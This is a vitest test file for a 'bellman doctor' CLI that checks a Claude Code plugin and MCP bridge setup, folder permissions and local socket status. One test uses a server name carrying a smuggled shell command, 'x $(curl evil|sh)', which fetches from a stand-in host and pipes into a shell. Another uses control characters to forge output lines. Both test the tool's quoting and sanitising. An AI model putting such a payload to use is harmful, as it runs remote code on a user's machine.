/**
 * `bellman doctor` (src/doctor.ts): every check against a fake machine, and `askDoor` against real sockets.
 */
import { spawn } from "node:child_process";
import { mkdtempSync, rmSync } from "node:fs";
import { createServer, type Server } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { run, type CliDeps } from "../src/cli.js";
import { askDoor, diagnose, doctor, type DoctorDeps, type DoorAnswer, type Finding } from "../src/doctor.js";
import { startDoor } from "../src/door.js";

const HOME = "/home/me";
const CWD = "/home/me/app";
const DOORS = `${HOME}/.claude/bellman/door`;
const PLUGINS = `${HOME}/.claude/plugins`;

interface Machine {
  version?: string;
  /** npm's latest; null makes `npm view` fail. */
  latest?: string | null;
  /** `claude --version`'s output; null makes it fail. */
  claude?: string | null;
  files?: Record<string, unknown>;
  /** The door folder's mode; null is no folder. */
  doorMode?: number | null;
  /** Each socket's answer to `GET /status`: a status, or what askDoor reports when it got none. */
  doors?: Record<string, unknown>;
  platform?: string;
  /** False when BELLMAN_DOOR_ROOT names the folder. */
  defaultRoot?: boolean;
}

function deps(m: Machine, out: string[] = []): DoctorDeps {
  return {
    version: m.version ?? "0.5.0",
    home: HOME,
    cwd: CWD,
    doorRoot: DOORS,
    doorRootIsDefault: m.defaultRoot ?? true,
    platform: m.platform ?? "darwin",
    exec: (command, args) => {
      const line = [command, ...args].join(" ");
      if (line === "npm view @bellman-sh/mcp-server version") {
        return m.latest === null ? { status: 1, stdout: "" } : { status: 0, stdout: `${m.latest ?? "0.5.0"}\n` };
      }
      if (line === "claude --version") {
        return m.claude === null ? { status: null, stdout: "" } : { status: 0, stdout: m.claude ?? "2.1.310 (Claude Code)\n" };
      }
      throw new Error(`unexpected exec: ${line}`);
    },
    readText: (path) => {
      const value = m.files?.[path];
      return value === undefined ? null : typeof value === "string" ? value : JSON.stringify(value);
    },
    listDir: (path) => (path === DOORS && m.doorMode !== null ? Object.keys(m.doors ?? {}) : null),
    mode: (path) => (path === DOORS ? (m.doorMode === undefined ? 0o40700 : m.doorMode) : null),
    askDoor: async (socketPath): Promise<DoorAnswer> => {
      const answer = m.doors?.[socketPath.slice(DOORS.length + 1)];
      return answer === "gone" || answer === "silent" ? answer : { status: answer };
    },
    out: (line) => out.push(line),
  };
}

const MARKETPLACE = { [`${PLUGINS}/known_marketplaces.json`]: { bellman: { source: { source: "github", repo: "bellman-sh/bellman" } } } };
const installed = (plugins: Record<string, unknown[]>) => ({ [`${PLUGINS}/installed_plugins.json`]: { version: 2, plugins } });
const user = (version: string) => [{ scope: "user", version }];
const USER_SETTINGS = `${HOME}/.claude/settings.json`;
const PROJECT_SETTINGS = `${CWD}/.claude/settings.json`;
const LOCAL_SETTINGS = `${CWD}/.claude/settings.local.json`;
const ENABLED = { [USER_SETTINGS]: { enabledPlugins: { "bellman@bellman": true, "bellman-mod@bellman": true } } };
const CLAUDE_JSON = `${HOME}/.claude.json`;
const USER_CHANNEL = { [CLAUDE_JSON]: { mcpServers: { bellman: { type: "stdio", command: "bellman-channel", args: [] } } } };
const LIVE_DOOR = { delivery: "hook", has_sign_in: true, seats: [{}, {}], waiting: [], recent: [], version: 1 };

const healthy: Machine = {
  files: { ...MARKETPLACE, ...ENABLED, ...installed({ "bellman@bellman": user("0.5.0"), "bellman-mod@bellman": user("0.5.0") }) },
  doors: { "2437.sock": LIVE_DOOR },
};

const fixes = (findings: Finding[]) => findings.filter((f) => f.status === "fix");
const commands = (findings: Finding[]) => fixes(findings).flatMap((f) => f.run ?? []);
const lines = (findings: Finding[]) => findings.map((f) => `${f.status} ${f.line}`);
/** Everything `doctor` prints for a machine. */
async function printed(m: Machine): Promise<string[]> {
  const out: string[] = [];
  await doctor(deps(m, out));
  return out;
}

describe("diagnose", () => {
  it("finds what #365 found: a user-scope bridge a release behind, and no marketplace, so no mod", async () => {
    const findings = await diagnose(deps({
      version: "0.4.0",
      files: USER_CHANNEL,
      doors: { "2437.sock": LIVE_DOOR, "8572.sock": "gone" },
    }));
    expect(commands(findings)).toEqual([
      "bellman update",
      "claude plugin marketplace add bellman-sh/bellman",
      "claude plugin install bellman-mod@bellman",
    ]);
    expect(lines(findings)).toContain(`ok One local bridge: MCP server "bellman" in ~/.claude.json (user scope).`);
    expect(lines(findings)).toContain("note 1 door was left by bridges that have exited; harmless.");
  });

  it("finds nothing to fix on a machine with the plugin, the mod and a signed-in bridge, all current", async () => {
    const findings = await diagnose(deps(healthy));
    expect(fixes(findings)).toEqual([]);
    expect(lines(findings)).toEqual([
      "ok The bellman package is 0.5.0, the latest.",
      "ok One local bridge: the bellman plugin 0.5.0.",
      "ok bellman-mod 0.5.0 is installed and enabled.",
      "ok The door 2437.sock answers: hook delivery, 2 seats, signed in.",
      "ok Claude Code is 2.1.310 (bellman-mod was written for 2.1.301; a build without mods skips it quietly).",
    ]);
  });

  it("removes the server when the enabled plugin and an MCP server both start a bridge", async () => {
    const findings = await diagnose(deps({ ...healthy, files: { ...healthy.files, ...USER_CHANNEL } }));
    expect(commands(findings)).toEqual(["claude mcp remove bellman -s user"]);
    expect(fixes(findings)[0].line).toMatch(/^2 local bridges start in every session/);
  });

  it("counts local-scope servers, and a remote server as no local bridge; keeps one of two servers and says which", async () => {
    const findings = await diagnose(deps({
      ...healthy,
      files: {
        ...MARKETPLACE,
        ...ENABLED,
        ...installed({ "bellman-mod@bellman": user("0.5.0") }),
        [CLAUDE_JSON]: {
          mcpServers: { hosted: { type: "http", url: "https://mcp.bellman.sh/mcp" } },
          projects: { [CWD]: { mcpServers: { b: { command: "npx", args: ["-y", "@bellman-sh/mcp-server"] } }, enabledMcpjsonServers: ["bell"] } },
        },
        [`${CWD}/.mcp.json`]: { mcpServers: { other: { command: "unrelated" }, bell: { command: "bellman-channel" } } },
      },
    }));
    expect(lines(findings)).toContain(
      `note MCP server "hosted" in ~/.claude.json (user scope) connects to the hosted server with no local bridge: the mod and the Stop hook see nothing through it.`,
    );
    // Two servers and no plugin: the local-scope one stays, the project one goes.
    expect(commands(findings)).toEqual(["claude mcp remove bell -s project"]);
    expect(fixes(findings)[0].line).toContain(`Keeping MCP server "b" in ~/.claude.json (local scope, this folder).`);
  });

  it("removes both servers when the enabled plugin starts a bridge as well", async () => {
    const files = {
      ...healthy.files,
      [CLAUDE_JSON]: {
        mcpServers: { one: { command: "bellman-channel" } },
        projects: { [CWD]: { mcpServers: { two: { command: "bellman-channel" } } } },
      },
    };
    expect(commands(await diagnose(deps({ ...healthy, files })))).toEqual(["claude mcp remove two -s local", "claude mcp remove one -s user"]);
  });

  it("counts a name in two scopes once, as the higher scope's server", async () => {
    const files = {
      ...MARKETPLACE,
      ...ENABLED,
      ...installed({ "bellman-mod@bellman": user("0.5.0") }),
      [CLAUDE_JSON]: {
        mcpServers: { bellman: { command: "bellman-channel" } },
        projects: { [CWD]: { mcpServers: { bellman: { command: "bellman-channel" } } } },
      },
    };
    const findings = await diagnose(deps({ ...healthy, files }));
    expect(fixes(findings)).toEqual([]);
    expect(lines(findings)).toContain(`ok One local bridge: MCP server "bellman" in ~/.claude.json (local scope, this folder).`);
  });

  it("counts a .mcp.json server only once approved, and says when it waits", async () => {
    const mcp = { [`${CWD}/.mcp.json`]: { mcpServers: { bell: { command: "bellman-channel" } } } };
    const base = { ...MARKETPLACE, ...ENABLED, ...installed({ "bellman-mod@bellman": user("0.5.0") }) };
    const waiting = await diagnose(deps({ ...healthy, files: { ...base, ...mcp } }));
    expect(lines(waiting)).toContain(`note MCP server "bell" in .mcp.json (project scope) waits for your approval in Claude Code, so it starts no bridge yet.`);
    expect(lines(waiting).some((l) => l.startsWith("ok One local bridge"))).toBe(false);

    const refused = { [CLAUDE_JSON]: { projects: { [CWD]: { disabledMcpjsonServers: ["bell"] } } } };
    const declined = await diagnose(deps({ ...healthy, files: { ...base, ...mcp, ...refused } }));
    expect(lines(declined).some((l) => l.includes('"bell"'))).toBe(false);

    const approved = { [CLAUDE_JSON]: { projects: { [CWD]: { enabledMcpjsonServers: ["bell"] } } } };
    expect(lines(await diagnose(deps({ ...healthy, files: { ...base, ...mcp, ...approved } })))).toContain(
      `ok One local bridge: MCP server "bell" in .mcp.json (project scope).`,
    );

    const all = { [LOCAL_SETTINGS]: { enableAllProjectMcpServers: true } };
    expect(lines(await diagnose(deps({ ...healthy, files: { ...base, ...mcp, ...all } })))).toContain(
      `ok One local bridge: MCP server "bell" in .mcp.json (project scope).`,
    );
    // A refusal wins over approving everything.
    const both = { ...all, ...refused };
    expect(lines(await diagnose(deps({ ...healthy, files: { ...base, ...mcp, ...both } }))).some((l) => l.includes('"bell"'))).toBe(false);
  });

  it("asks for the plugin when nothing starts a bridge, by the marketplace's own name", async () => {
    const files = {
      [`${PLUGINS}/known_marketplaces.json`]: { "bm": { source: { source: "git", url: "https://github.com/bellman-sh/bellman.git" } } },
      ...installed({ "bellman-mod@bm": user("0.5.0") }),
      [USER_SETTINGS]: { enabledPlugins: { "bellman-mod@bm": true } },
    };
    expect(commands(await diagnose(deps({ ...healthy, files })))).toEqual(["claude plugin install bellman@bm"]);
  });

  it("does not count a project-scope install made for another folder", async () => {
    const files = { ...MARKETPLACE, ...ENABLED, ...installed({ "bellman@bellman": user("0.5.0"), "bellman-mod@bellman": [{ scope: "project", projectPath: "/elsewhere", version: "0.5.0" }] }) };
    expect(commands(await diagnose(deps({ ...healthy, files })))).toEqual(["claude plugin install bellman-mod@bellman"]);
  });

  it("enables a disabled mod, and updates a plugin or a mod behind npm", async () => {
    const disabled = { ...healthy.files, [USER_SETTINGS]: { enabledPlugins: { "bellman@bellman": true, "bellman-mod@bellman": false } } };
    expect(commands(await diagnose(deps({ ...healthy, files: disabled })))).toEqual(["claude plugin enable bellman-mod@bellman"]);

    const behind = { ...MARKETPLACE, ...ENABLED, ...installed({ "bellman@bellman": user("0.4.0"), "bellman-mod@bellman": user("0.4.0") }) };
    expect(commands(await diagnose(deps({ ...healthy, files: behind })))).toEqual([
      "claude plugin update bellman@bellman",
      "claude plugin update bellman-mod@bellman",
    ]);
  });

  it("compares no version when npm cannot be asked", async () => {
    const findings = await diagnose(deps({ ...healthy, version: "0.1.0", latest: null }));
    expect(fixes(findings)).toEqual([]);
    expect(lines(findings)[0]).toBe("note Could not ask npm for the latest version, so no version below is compared.");
  });

  it("reads a file it cannot parse as absent", async () => {
    const files = { ...healthy.files, [`${PLUGINS}/known_marketplaces.json`]: "{ not json" };
    const findings = await diagnose(deps({ ...healthy, files }));
    expect(commands(findings)).toContain("claude plugin marketplace add bellman-sh/bellman");
  });

  it("closes a door folder others can enter, and counts an answer of the wrong shape as no answer", async () => {
    const { delivery, has_sign_in, seats, ...rest } = LIVE_DOOR;
    const findings = await diagnose(deps({
      ...healthy,
      doorMode: 0o40755,
      doors: {
        "1.sock": { ...rest, has_sign_in, seats },
        "2.sock": { ...rest, delivery, seats },
        "3.sock": { ...rest, delivery, has_sign_in },
        "4.sock": "gone",
        "5.sock": "silent",
      },
    }));
    expect(commands(findings)).toEqual([`chmod 700 ${DOORS}`]);
    expect(lines(findings)).toContain("note 1 door was left by bridges that have exited; harmless.");
    expect(lines(findings)).toContain("note 4 doors did not answer as expected: 1.sock, 2.sock, 3.sock, 5.sock.");
    expect(lines(findings)).toContain("note No running bridge answered: the mod shows a bridge once a Claude Code session has started it.");
  });

  it("notes a bridge with no sign-in, and a machine where no door was ever opened", async () => {
    const signedOut = await diagnose(deps({ ...healthy, doors: { "9.sock": { ...LIVE_DOOR, has_sign_in: false, seats: [{}] } } }));
    expect(lines(signedOut)).toContain(
      "note The door 9.sock answers: hook delivery, 1 seat, not signed in: the next Bellman tool call in that session asks you to sign in.",
    );
    const none = await diagnose(deps({ ...healthy, doorMode: null }));
    expect(lines(none)).toContain(`note No bridge has opened a door yet (${DOORS} does not exist).`);
  });

  it("asks for a newer Claude Code than the mod's, and notes a claude it cannot run", async () => {
    expect(commands(await diagnose(deps({ ...healthy, claude: "2.1.250 (Claude Code)" })))).toEqual(["claude update"]);
    expect(lines(await diagnose(deps({ ...healthy, claude: null })))).toContain(
      "note Could not run claude --version, so the Claude Code build is not checked.",
    );
  });
});

describe("what enabled means", () => {
  const base = { ...MARKETPLACE, ...installed({ "bellman@bellman": user("0.5.0"), "bellman-mod@bellman": user("0.5.0") }) };

  it("reads a plugin with no enabledPlugins entry as disabled", async () => {
    const findings = await diagnose(deps({ ...healthy, files: base }));
    expect(commands(findings)).toEqual(["claude plugin enable bellman@bellman", "claude plugin enable bellman-mod@bellman"]);
  });

  it("takes a project file's true for a plugin the user file lacks", async () => {
    const files = { ...base, [PROJECT_SETTINGS]: { enabledPlugins: { "bellman@bellman": true, "bellman-mod@bellman": true } } };
    expect(fixes(await diagnose(deps({ ...healthy, files })))).toEqual([]);
  });

  it("lets settings.local.json's false disable what the project file enables", async () => {
    const files = {
      ...base,
      [PROJECT_SETTINGS]: { enabledPlugins: { "bellman@bellman": true, "bellman-mod@bellman": true } },
      [LOCAL_SETTINGS]: { enabledPlugins: { "bellman-mod@bellman": false } },
    };
    expect(commands(await diagnose(deps({ ...healthy, files })))).toEqual(["claude plugin enable bellman-mod@bellman"]);
  });

  it("makes the fix for an installed, disabled plugin enabling it, with no separate note", async () => {
    const files = { ...base, [USER_SETTINGS]: { enabledPlugins: { "bellman-mod@bellman": true } } };
    const findings = await diagnose(deps({ ...healthy, files }));
    expect(commands(findings)).toEqual(["claude plugin enable bellman@bellman"]);
    expect(lines(findings).some((l) => l.startsWith("note ") && l.includes("installed and disabled"))).toBe(false);
  });
});

describe("which servers are Bellman's", () => {
  const bridges = async (servers: Record<string, unknown>): Promise<string[]> => {
    const files = { ...MARKETPLACE, ...ENABLED, ...installed({ "bellman-mod@bellman": user("0.5.0") }), [CLAUDE_JSON]: { mcpServers: servers } };
    return lines(await diagnose(deps({ ...healthy, files }))).filter((l) => l.includes("bridge") || l.includes("MCP server"));
  };

  it("takes a node script named channel.js under a bellman path for a local bridge", async () => {
    expect(await bridges({ x: { command: "node", args: ["/home/me/src/bellman/dist/channel.js"] } })).toEqual([
      `ok One local bridge: MCP server "x" in ~/.claude.json (user scope).`,
    ]);
    // Not any channel.js.
    expect((await bridges({ x: { command: "node", args: ["/home/me/other/dist/channel.js"] } }))[0]).toMatch(/^fix No local bridge/);
  });

  it("takes npx mcp-remote with a bellman.sh URL for a remote server", async () => {
    const found = await bridges({ x: { command: "npx", args: ["mcp-remote", "https://mcp.bellman.sh/mcp"] } });
    expect(found[0]).toMatch(/^note MCP server "x" in ~\/\.claude\.json \(user scope\) connects to the hosted server/);
  });

  it("reads a server with bellman.sh only in its env as neither", async () => {
    const found = await bridges({ x: { command: "node", args: ["server.js"], env: { HOST: "mcp.bellman.sh", BIN: "bellman-channel" } } });
    expect(found).toHaveLength(1);
    expect(found[0]).toMatch(/^fix No local bridge/);
  });
});

describe("the marketplace", () => {
  it("does not take bellman-sh/bellman-anything.git for this repo", async () => {
    const files = { [`${PLUGINS}/known_marketplaces.json`]: { other: { source: { source: "git", url: "https://github.com/bellman-sh/bellman-anything.git" } } } };
    expect(commands(await diagnose(deps({ ...healthy, files })))).toContain("claude plugin marketplace add bellman-sh/bellman");
  });

  it("takes a local-path marketplace keyed bellman", async () => {
    const files = { ...healthy.files, [`${PLUGINS}/known_marketplaces.json`]: { bellman: { source: { source: "directory", path: "/home/me/src/bellman" } } } };
    expect(fixes(await diagnose(deps({ ...healthy, files })))).toEqual([]);
  });
});

describe("the door folder's mode", () => {
  const open = { ...healthy, doorMode: 0o40755 };

  it("is a fix with chmod when the default folder is open", async () => {
    const findings = await diagnose(deps(open));
    expect(commands(findings)).toEqual([`chmod 700 ${DOORS}`]);
    expect(fixes(findings)[0].line).toContain("a bridge creates it 0700");
  });

  it("is a note when BELLMAN_DOOR_ROOT names the folder", async () => {
    const findings = await diagnose(deps({ ...open, defaultRoot: false }));
    expect(commands(findings)).toEqual([]);
    expect(lines(findings).some((l) => l.startsWith("note ") && l.includes("open to other users"))).toBe(true);
  });

  it("is a note on Windows, which reports group and other bits on every folder", async () => {
    const findings = await diagnose(deps({ ...open, platform: "win32" }));
    expect(commands(findings)).toEqual([]);
    expect(lines(findings).some((l) => l.startsWith("note ") && l.includes("open to other users"))).toBe(true);
  });
});

describe("what is printed", () => {
  it("quotes a command argument that is not plain, so a server's name cannot run anything", async () => {
    const name = "x $(curl evil|sh)";
    const files = {
      ...healthy.files,
      [`${CWD}/.mcp.json`]: { mcpServers: { [name]: { command: "bellman-channel" } } },
      [CLAUDE_JSON]: { projects: { [CWD]: { enabledMcpjsonServers: [name] } } },
    };
    const out = await printed({ ...healthy, files });
    expect(out).toContain("        $ claude mcp remove 'x $(curl evil|sh)' -s project");
  });

  it("writes a single quote inside a quoted argument as '\\''", async () => {
    const name = "it's";
    const files = {
      ...healthy.files,
      [`${CWD}/.mcp.json`]: { mcpServers: { [name]: { command: "bellman-channel" } } },
      [CLAUDE_JSON]: { projects: { [CWD]: { enabledMcpjsonServers: [name] } } },
    };
    expect(await printed({ ...healthy, files })).toContain("        $ claude mcp remove 'it'\\''s' -s project");
  });

  it("quotes the door folder in chmod", async () => {
    const out = await printed({ ...healthy, doorMode: 0o40755 });
    expect(out).toContain(`        $ chmod 700 ${DOORS}`);
    const spaced = deps({ ...healthy, doorMode: 0o40755 }, []);
    const found = await diagnose({ ...spaced, doorRoot: "/a b" , mode: () => 0o40755, listDir: () => [] });
    expect(commands(found)).toEqual(["chmod 700 '/a b'"]);
  });

  it("prints no control character from a name or a door's delivery", async () => {
    const name = "a\nfix   forged line\u{1b}[2J";
    const files = {
      ...healthy.files,
      [`${CWD}/.mcp.json`]: { mcpServers: { [name]: { command: "bellman-channel" } } },
      [CLAUDE_JSON]: { projects: { [CWD]: { enabledMcpjsonServers: [name] } } },
    };
    const out = await printed({ ...healthy, files, doors: { "7\n.sock": { ...LIVE_DOOR, delivery: "hook\n\u{1b}[2Jx" } } });
    expect(out.length).toBeGreaterThan(5);
    for (const line of out) expect(line).not.toMatch(/\p{Cc}/u);
    expect(out.some((l) => l.includes("forged line"))).toBe(true);
    expect(out.some((l) => l.includes("hook[2Jx delivery"))).toBe(true);
  });

  it("prints each command once across the report", async () => {
    const out = await printed({ files: {}, doors: {} });
    expect(out.filter((l) => l === "        $ claude plugin marketplace add bellman-sh/bellman")).toHaveLength(1);
    expect(out).toContain("        $ claude plugin install bellman@bellman");
    expect(out).toContain("        $ claude plugin install bellman-mod@bellman");
  });
});

describe("doctor", () => {
  it("prints each finding with its commands, and exits 1 when there is something to fix", async () => {
    const out: string[] = [];
    expect(await doctor(deps({ ...healthy, version: "0.4.0" }, out))).toBe(1);
    expect(out.slice(0, 2)).toEqual([
      "fix   The bellman package is 0.4.0; the latest is 0.5.0.",
      "        $ bellman update",
    ]);
    expect(await doctor(deps(healthy, []))).toBe(0);
  });

  it("is routed from the bellman command, and refuses an argument", async () => {
    const out: string[] = [];
    const err: string[] = [];
    const d = deps(healthy, out);
    const cli = { ...d, err: (line: string) => err.push(line), doctor: d } as unknown as CliDeps;
    expect(await run(["doctor"], cli)).toBe(0);
    expect(out[0]).toBe("ok    The bellman package is 0.5.0, the latest.");
    expect(await run(["doctor", "--fix"], cli)).toBe(1);
    expect(err[0]).toBe("bellman: doctor does not take --fix");
  });
});

describe("askDoor", () => {
  const temps: string[] = [];
  const servers: Server[] = [];
  afterEach(async () => {
    for (const server of servers.splice(0)) await new Promise<void>((done) => server.close(() => done()));
    for (const dir of temps.splice(0)) rmSync(dir, { recursive: true, force: true });
  });
  const tempDir = (): string => {
    const dir = mkdtempSync(join(tmpdir(), "bd-"));
    temps.push(dir);
    return dir;
  };
  /** A socket whose every connection is handed to `onRequest`, after the request's bytes arrive. */
  async function listen(socketPath: string, onRequest: (write: (text: string) => boolean, end: () => void) => void): Promise<void> {
    const server = createServer((socket) => {
      socket.on("error", () => undefined);
      socket.once("data", () => onRequest((text) => socket.write(text), () => socket.end()));
    });
    servers.push(server);
    await new Promise<void>((done) => server.listen(socketPath, done));
  }

  it("reads a real door's status, and says gone where nothing is at the path", async () => {
    const dir = tempDir();
    const door = await startDoor(join(dir, "1.sock"), {
      delivery: "hook",
      hasSignIn: () => true,
      seats: () => [{ session_id: "qs_1", member_id: "m_1", retrying: false }],
      recent: () => [],
      readEvents: async () => ({ status: 404, body: {} }),
      readRooms: async () => ({ status: 200, body: { rooms: [] } }),
      readSurface: async () => ({ status: 404, body: {} }),
      decline: async () => ({ status: 404, body: {} }),
      writeSurface: async () => ({ status: 404, body: {} }),
      setStatus: async () => ({ status: 200, body: { sent: 0 } }),
    } as Parameters<typeof startDoor>[1]);
    try {
      const answer = (await askDoor(door.path)) as { status: { delivery: string; has_sign_in: boolean; seats: unknown[] } };
      expect([answer.status.delivery, answer.status.has_sign_in, answer.status.seats.length]).toEqual(["hook", true, 1]);
    } finally {
      await door.close();
    }
    expect(await askDoor(join(dir, "1.sock"))).toBe("gone");
  });

  it("says gone for a socket file whose bridge was killed", async () => {
    const dir = tempDir();
    const socketPath = join(dir, "dead.sock");
    const child = spawn(process.execPath, ["-e", `require("net").createServer().listen(${JSON.stringify(socketPath)}, () => console.log("up"))`], {
      stdio: ["ignore", "pipe", "inherit"],
    });
    await new Promise<void>((up) => child.stdout.once("data", () => up()));
    await new Promise<void>((exited) => {
      child.once("exit", () => exited());
      child.kill("SIGKILL");
    });
    expect(await askDoor(socketPath)).toBe("gone");
  });

  it("settles as silent on a door that sends headers and then stalls", async () => {
    const socketPath = join(tempDir(), "stall.sock");
    await listen(socketPath, (write) => void write("HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 100\r\n\r\n{"));
    const started = Date.now();
    expect(await askDoor(socketPath)).toBe("silent");
    expect(Date.now() - started).toBeLessThan(2500);
  });

  it("settles as silent on a door that trickles past the deadline", async () => {
    const socketPath = join(tempDir(), "trickle.sock");
    await listen(socketPath, (write) => {
      write("HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 1000\r\n\r\n");
      const timer = setInterval(() => {
        if (!write(" ")) clearInterval(timer);
      }, 100);
      setTimeout(() => clearInterval(timer), 3000);
    });
    const started = Date.now();
    expect(await askDoor(socketPath)).toBe("silent");
    expect(Date.now() - started).toBeLessThan(2500);
  });

  it("settles as silent on an answer over 64 KB", async () => {
    const socketPath = join(tempDir(), "big.sock");
    const big = JSON.stringify({ pad: "x".repeat(100_000) });
    await listen(socketPath, (write, end) => {
      write(`HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: ${big.length}\r\n\r\n${big}`);
      end();
    });
    expect(await askDoor(socketPath)).toBe("silent");
  });

  it("settles as silent on a non-200 answer and on a body that is not JSON", async () => {
    const dir = tempDir();
    await listen(join(dir, "404.sock"), (write, end) => {
      write('HTTP/1.1 404 Not Found\r\ncontent-length: 2\r\n\r\n{}');
      end();
    });
    await listen(join(dir, "text.sock"), (write, end) => {
      write("HTTP/1.1 200 OK\r\ncontent-length: 5\r\n\r\nhello");
      end();
    });
    expect(await askDoor(join(dir, "404.sock"))).toBe("silent");
    expect(await askDoor(join(dir, "text.sock"))).toBe("silent");
  });
});
